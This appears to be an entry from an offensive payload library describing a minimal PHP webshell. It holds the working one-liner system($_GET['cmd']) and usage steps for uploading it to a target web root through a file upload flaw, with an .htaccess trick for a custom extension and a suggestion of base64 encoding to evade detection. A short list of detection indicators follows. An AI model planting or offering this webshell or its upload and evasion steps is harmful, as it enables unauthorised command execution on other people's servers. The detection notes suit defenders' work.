---
id: uuid-simple-php-webshell
name: Simple-PHP-RCE-Webshell
type: code
language: php
verified: true
created_at: '2023-10-01T00:00:00.000000+00:00'
updated_at: '2023-10-01T00:00:00.000000+00:00'
platforms:
  - Web
  - Apache
tags:
  - rce
  - webshell
  - php
  - payload
validated: true
---

# Simple-PHP-RCE-Webshell

## Code

```php
<?php system($_GET['cmd']); ?>
```

## Description

A minimal PHP webshell that executes system commands passed via the 'cmd' GET parameter. When accessed in a browser (e.g., shell.rce?cmd=ls), it runs the command and outputs the result, providing basic RCE capability.

## Parameters

| Variable | Description | Example |
|----------|-------------|---------|
| $_GET['cmd'] | Command to execute on the server | ls -la or whoami |

## Usage

Save as a .rce file (after configuring .htaccess for PHP parsing) and upload to the target web root. Access via http://target.com/shell.rce?cmd=<command> for execution. Ideal for initial RCE in file upload exploits; extend with base64 encoding for evasion.

## Detection

- Web logs showing GET requests with 'cmd' parameter to unusual files.
- PHP execution logs (if enabled) for system() calls.
- Antivirus/EDR scanning for webshell patterns like system($_GET).
- Network monitoring for command output in HTTP responses.

## Related

- [[procedures/Configure-Apache-PHP-Handler-via-htaccess-for-RCE]]
